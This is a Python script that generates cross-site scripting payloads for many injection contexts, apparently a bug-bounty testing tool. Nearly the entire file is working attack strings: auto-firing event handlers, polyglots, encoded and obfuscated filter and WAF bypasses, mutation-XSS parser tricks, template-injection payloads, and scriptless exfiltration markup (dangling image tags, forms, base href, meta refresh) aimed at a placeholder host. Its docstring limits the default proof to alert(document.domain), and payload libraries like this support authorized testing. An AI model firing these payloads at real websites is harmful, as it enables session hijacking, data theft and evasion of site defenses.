#!/usr/bin/env python3
"""Context-aware XSS payload generator (offline). Also imported by xss_reflect.py.

Usage:
  xss_payloads.py --context html|attr-dq|attr-sq|attr-unquoted|url-attr|event-attr|js-sq|js-dq|js-template|
                            js-block|comment|rcdata|style|json|all
                  [--families basic,events,autofocus,noparen,nospace,noquote,svg,mathml,polyglot,encoding,
                              csti,scriptless,url,css,mxss,waf] [--allowed '<>"\x27`()/=']
                  [--js 'alert(document.domain)'] [--rcdata-tag textarea] [--scriptless-host YOUR.HOST]

--allowed limits output to payloads whose special characters all survive (from xss_reflect.py).
Output TSV: context, family, needs_interaction, payload.
Default proof is alert(document.domain) - shows which origin executed. Never use cookie-stealing or
third-party collector URLs; blind payloads come from xss_files.py --callback YOUR-OWN-HOST.
"""
import argparse
import sys

SPECIAL = set("<>\"'`()/=;:{}\\ ")
EVENTS_AUTO = [  # fire without interaction (tag, attrs)
    ("img", "src=x onerror={J}"), ("svg", "onload={J}"), ("body", "onload={J}"),
    ("details", "open ontoggle={J}"), ("input", "autofocus onfocus={J}"), ("select", "autofocus onfocus={J}"),
    ("textarea", "autofocus onfocus={J}"), ("iframe", "onload={J}"), ("video", "src=x onerror={J}"),
    ("audio", "src=x onerror={J}"), ("marquee", "onstart={J}"), ("style", "onload={J}"),
    ("object", "data=x onerror={J}"), ("x", "onanimationstart={J} style=animation-name:bbx"),
    ("svg", "><animate onbegin={J} attributeName=x dur=1s"), ("svg", "><set onbegin={J} attributeName=x"),
    ("svg", "><animate onend={J} attributeName=x dur=1s"),
    ("x", "contenteditable autofocus onfocusin={J}"), ("a", "id=x tabindex=1 onfocus={J} autofocus"),
]
EVENTS_INTERACT = ["onclick", "onmouseover", "onmouseenter", "onpointerover", "onpointerrawupdate", "onauxclick",
                   "oncontextmenu", "onbeforeinput", "oninput", "onkeydown", "oncopy", "onpaste", "onwheel",
                   "ontouchstart", "ontouchend", "onbeforetoggle", "ondrag", "onblur", "onmousedown"]
POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={J} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={J}//>\\x3e",
    "'\"</Script><Html Onmouseover=({J})//",
    "\"'`><img src=xxx:x onerror={J}>",
    "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload={J}//>",
    "-->'\"/></sCript><svG x=\">\" onload=({J})>",
    "'\"><svg/onload={J}>{{7*7}}${7*7}",   # XSS + SQLi + SSTI/CSTI triage in one string
    "\" onclick={J}//<button ' onclick={J}//> */ {J}//",
]


def js_noparen(j):
    if j.startswith("alert(") and j.endswith(")"):
        arg = j[6:-1]
        return [f"alert`{arg}`" if "(" not in arg else "alert`1`", f"onerror=alert;throw {arg}",
                "{onerror=alert}throw 1", f"window.onerror=alert;throw {arg}"]
    return ["alert`1`", "onerror=alert;throw 1"]


def build(context, J="alert(document.domain)", families=None, rcdata_tag="textarea", host=None):
    fam = set(families or ["basic", "events", "autofocus", "noparen", "nospace", "noquote", "svg", "polyglot"])
    out = []

    def add(f, p, interact=False):
        out.append(dict(context=context, family=f, interact=interact, payload=p.replace("{J}", J)))

    np = js_noparen(J)
    pre = {"html": "", "attr-dq": "\">", "attr-sq": "'>", "attr-unquoted": " >", "comment": "--!>",
           "rcdata": f"</{rcdata_tag}>", "style": "</style>", "js-block": "</script>", "json": "",
           "url-attr": "\">", "event-attr": "\">", "js-sq": "</script>", "js-dq": "</script>",
           "js-template": "</script>"}.get(context, "")

    # ---- tag-injection contexts ---------------------------------------------------------------
    if context in ("html", "attr-dq", "attr-sq", "attr-unquoted", "comment", "rcdata", "style", "js-block", "json",
                   "url-attr", "event-attr", "js-sq", "js-dq", "js-template"):
        if "basic" in fam:
            for p in ("<script>{J}</script>", "<img src=x onerror={J}>", "<svg onload={J}>", "<svg/onload={J}>",
                      "<details open ontoggle={J}>", "<iframe srcdoc=\"<script>parent.{J}</script>\">"):
                add("basic", pre + p)
        if "events" in fam:
            for tag, attrs in EVENTS_AUTO:
                add("events", pre + f"<{tag} {attrs}>")
            for ev in EVENTS_INTERACT:
                add("events", pre + f"<a href=# {ev}={{J}}>bbx</a>", True)
        if "noparen" in fam:
            for j in np:
                add("noparen", pre + f"<svg onload={j}>")
                add("noparen", pre + f"<img src=x onerror={j}>")
        if "nospace" in fam:
            add("nospace", pre + "<svg/onload={J}>")
            add("nospace", pre + "<img/src/onerror={J}>")
            add("nospace", pre + "<svg\x0conload={J}>".replace("\x0c", "%0C"))
            add("nospace", pre + "<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//")
        if "noquote" in fam:
            add("noquote", pre + "<svg onload=alert(document.domain)>")
            add("noquote", pre + "<svg onload=alert(/bbx/.source)>")
            add("noquote", pre + "<img src=x onerror=top[8680439..toString(30)](document.domain)>")
        if "svg" in fam:
            for p in ("<svg><script>{J}</script>", "<svg><animate onbegin={J} attributeName=x dur=1s>",
                      "<svg><set attributeName=onmouseover to={J}><circle r=100 /></svg>",
                      "<svg><a><animate attributeName=href values=javascript:{J} /><text y=20>bbx</text></a></svg>",
                      "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='{J}'/></svg>#x\"/></svg>",
                      "<svg><foreignObject><iframe srcdoc=\"&lt;script&gt;parent.{J}&lt;/script&gt;\"></iframe></foreignObject></svg>"):
                add("svg", pre + p, "set attributeName" in p or "<a>" in p)
        if "mathml" in fam:
            for p in ("<math><mtext><table><mglyph><style><img src=x onerror={J}>",
                      "<math><x xlink:href=javascript:{J}>bbx</x></math>",
                      "<math href=javascript:{J}><mtext>bbx</mtext></math>",
                      "<math><maction actiontype=statusline xlink:href=javascript:{J}>bbx<mtext>x</mtext></maction></math>"):
                add("mathml", pre + p, "xlink" in p or "href" in p)
        if "polyglot" in fam:
            for p in POLYGLOTS:
                add("polyglot", p, "onclick" in p or "onmouseover" in p.lower())
        if "encoding" in fam:
            add("encoding", pre + "<svg onload=&#97;&#108;&#101;&#114;&#116;(document.domain)>")
            add("encoding", pre + "<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>")
            add("encoding", pre + "<img src=x onerror=\\u0061lert(document.domain)>")
            add("encoding", pre + "<img src=x onerror=eval('\\x61lert(document.domain)')>")
            add("encoding", pre + "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>")
            add("encoding", pre + "<img src=x onerror=[]['constructor']['constructor']('ale'+'rt(document.domain)')()>")
            add("encoding", "%3Csvg%20onload%3D" + J.replace("(", "%28").replace(")", "%29") + "%3E")
            add("encoding", "%253Csvg%2520onload%253D" + J + "%253E")
            add("encoding", "+ADw-script+AD4-" + J + "+ADw-/script+AD4-")      # UTF-7 (legacy charset sniffing)
        if "waf" in fam:
            for p in ("<x onauxclick={J}>bbx", "<x/onpointerrawupdate={J}>bbx", "\"><details/open/ontoggle={J}>",
                      "<img src=x onError=import('data:text/javascript,{J}')>", "<svg onload={J}<!--",
                      "<script%0a>{J}</script%0a>", "<!----><script>{J}</script>", "<img src=`xx:xx`onerror={J}>",
                      "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:{J}&NewLine;>bbx</a>",
                      "<img src=x onerror=window['al'+'ert'](document.domain)>",
                      "<svg onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//",
                      "<sVg/oNloAd=\"JaVaScRiPt:/**\\/*\\'/\"\\eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))\">",
                      "onffocusofocuscfocusufocuss={J} autofocus",   # recursive keyword-strip bypass
                      "<<img src=x onerror={J}>", "<img src=x onerror={J}//", "<scr<script>ipt>{J}</scr</script>ipt>"):
                inter = "onauxclick" in p or "pointer" in p or "mouseover" in p
                if p.startswith(("<", "\"")):
                    add("waf", (pre if p.startswith("<") else "") + p, inter)
                elif context.startswith("attr-"):   # tag-less attribute payloads only make sense inside a tag
                    q = {"attr-dq": "\"", "attr-sq": "'"}.get(context, "")
                    add("waf", f"{q} {p} x={q}", inter)
        if "mxss" in fam:
            for p in ("<noscript><p title=\"</noscript><img src=x onerror={J}>\">",
                      "<svg></p><style><a id=\"</style><img src=1 onerror={J}>\">",
                      "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror={J}&gt;\">",
                      "<form><math><mtext></form><form><mglyph><style></math><img src onerror={J}>",
                      "<listing>&lt;img src=x onerror={J}&gt;</listing>",
                      "<xmp><p title=\"</xmp><img src=x onerror={J}>\">"):
                add("mxss", p)
        if "scriptless" in fam:
            h = host or "YOUR.HOST"
            add("scriptless", pre + f"<base href=\"https://{h}/\">")
            add("scriptless", pre + f"<form action=\"https://{h}/bbx\" method=post><input name=bbx value=1><button>Continue</button></form>", True)
            add("scriptless", pre + f"<button formaction=\"https://{h}/bbx\">x</button>", True)
            add("scriptless", pre + f"<meta http-equiv=\"refresh\" content=\"0; url=https://{h}/bbx\">")
            add("scriptless", pre + f"<img src='https://{h}/dangling?")          # dangling markup (PortSwigger)
            add("scriptless", pre + f"<a ping=\"https://{h}/ping\" href=#>bbx</a>", True)
            add("scriptless", pre + "<a href=https://example.org>bbx</a>")
    # ---- attribute-only contexts (no new tag needed) --------------------------------------------
    if context in ("attr-dq", "attr-sq", "attr-unquoted"):
        q = {"attr-dq": "\"", "attr-sq": "'", "attr-unquoted": ""}[context]
        sp = " " if context == "attr-unquoted" else ""
        if "autofocus" in fam or "events" in fam:
            add("autofocus", f"{q}{sp} autofocus onfocus={{J}} x={q}")
            add("autofocus", f"{q}{sp}autofocus/onfocus={{J}}//")
            add("autofocus", f"{q}{sp} type=text autofocus onfocus={{J}} x={q}")   # for type=hidden inputs
            add("autofocus", f"{q}{sp} onfocus={{J}} tabindex=1 id=bbx x={q}", True)
            add("events", f"{q}{sp} onmouseover={{J}} style=position:fixed;inset:0 x={q}", True)
            add("events", f"{q}{sp} onanimationstart={{J}} style=animation-name:bbx x={q}")
            add("events", f"{q}{sp} accesskey=x onclick={{J}} x={q}", True)
            add("events", f"{q}{sp} popover id=bbx onbeforetoggle={{J}} x={q}", True)
        if "noparen" in fam:
            for j in np:
                add("noparen", f"{q}{sp} autofocus onfocus={j} x={q}")
        if "encoding" in fam and q:
            add("encoding", ("&quot;" if q == "\"" else "&#39;") + " autofocus onfocus={J} x=")
    if context in ("url-attr",):
        for p in ("javascript:{J}", "JaVaScRiPt:{J}", "javascript://%0a{J}", "javascript://%250a{J}",
                  "java%0ascript:{J}", "java&Tab;script:{J}", "&#106;avascript:{J}", "\\x01javascript:{J}",
                  "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+{J}//'>",
                  "data:text/html,<script>{J}</script>", "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
                  "/x:1/:///%01javascript:{J}/", "javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"):
            add("url", p, True)
    if context == "event-attr":
        for p in ("{J}", "';{J};//", "\";{J};//", "&apos;-{J}-&apos;", "&#39;);{J};//"):
            add("events", p)
    # ---- JavaScript contexts ------------------------------------------------------------------
    if context in ("js-sq", "js-dq", "js-template", "js-block"):
        q = {"js-sq": "'", "js-dq": "\"", "js-template": "`", "js-block": ""}[context]
        if q in ("'", "\""):
            for p in (f"{q}-{{J}}-{q}", f"{q};{{J}};//", f"{q}*{{J}}*{q}", f"{q}^{{J}}^{q}", f"{q}/{{J}}/{q}",
                      f"\\{q};{{J}};//", f"{q}-alert`1`-{q}", f"{q}}};{{J}};//", f"{q});{{J}};//",
                      f"{q},{{J}},{q}"):
                add("js-string", p)
        if q == "`":
            add("js-template", "${{J}}")
            add("js-template", "`;{J};//")
        if context == "js-block":
            add("js-block", ";{J};//")
            add("js-block", "*/{J}/*")
            add("js-block", "*/alert(1)</script><script>/*")
        add("js-break", "</script><svg onload={J}>")
        add("js-break", "</ScRiPt><img src=x onerror={J}>")
    if context == "style":
        for p in ("</style><svg onload={J}>", "@import 'https://YOUR.HOST/bbx.css';",
                  "x{background:url(\"javascript:{J}\")}", "x:expression({J})",   # legacy IE only
                  "</style><style>@keyframes bbx{}</style><x style=animation-name:bbx onanimationstart={J}>"):
            add("css", p)
    if "csti" in fam or context == "all":
        for p in ("{{7*7}}", "{{constructor.constructor('{J}')()}}", "{{$on.constructor('{J}')()}}",
                  "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };{J}//');}}",
                  "{{_c.constructor('{J}')()}}", "{{this.constructor.constructor('{J}')()}}",
                  "<div v-html=\"'<img src=x onerror={J}>'\"></div>", "[[constructor.constructor('{J}')()]]",
                  "${7*7}", "#{7*7}", "<%= 7*7 %>"):
            add("csti", p.replace("'{J}'", "'" + J.replace("'", "\\'") + "'"))
    return out


CONTEXTS = ["html", "attr-dq", "attr-sq", "attr-unquoted", "url-attr", "event-attr", "js-sq", "js-dq", "js-template",
            "js-block", "comment", "rcdata", "style", "json"]
ALL_FAMILIES = ["basic", "events", "autofocus", "noparen", "nospace", "noquote", "svg", "mathml", "polyglot",
                "encoding", "csti", "scriptless", "url", "css", "mxss", "waf"]


def fits(p, allowed):
    if allowed is None:
        return True
    return all(c in allowed for c in set(p) & SPECIAL)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--context", default="html")
    ap.add_argument("--families", default="basic,events,autofocus,noparen,nospace,noquote,svg,polyglot")
    ap.add_argument("--allowed", help="characters that survive unencoded (plus letters/digits)")
    ap.add_argument("--js", default="alert(document.domain)")
    ap.add_argument("--rcdata-tag", default="textarea")
    ap.add_argument("--scriptless-host")
    a = ap.parse_args()
    fams = ALL_FAMILIES if a.families == "all" else [f.strip() for f in a.families.split(",")]
    ctxs = CONTEXTS if a.context == "all" else [c.strip() for c in a.context.split(",")]
    for c in ctxs:
        if c not in CONTEXTS:
            sys.exit(f"unknown context {c}; choose from {', '.join(CONTEXTS)}")
    allowed = set(a.allowed) if a.allowed is not None else None
    print("context\tfamily\tneeds_interaction\tpayload")
    seen = set()
    for c in ctxs:
        for r in build(c, a.js, fams, a.rcdata_tag, a.scriptless_host):
            if r["payload"] in seen or not fits(r["payload"], allowed):
                continue
            seen.add(r["payload"])
            print(f"{r['context']}\t{r['family']}\t{'yes' if r['interact'] else 'no'}\t{r['payload']}")


if __name__ == "__main__":
    main()
